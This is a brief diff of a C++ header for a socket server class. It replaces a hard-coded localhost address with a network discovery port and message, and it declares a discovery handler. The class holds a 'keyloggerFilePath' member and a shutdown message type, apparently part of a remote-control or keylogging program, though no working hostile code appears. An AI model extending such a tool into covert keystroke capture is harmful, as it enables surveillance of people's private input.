@@ -22,7 +22,9 @@
 
 
 #define PORT 8080
-#define SERVER_IP "127.0.0.1"
+// #define SERVER_IP "127.0.0.1"
+#define DISCOVERY_PORT 8081
+#define DISCOVERY_MESSAGE "DISCOVER_SERVER"
 
 enum MessageType {
     SHUTDOWN,
@@ -80,6 +82,8 @@ private:
     std::string response;
 
     std::string keyloggerFilePath;
+
+    void handleDiscoveryRequests();
 
 public:
     ServerSocket();
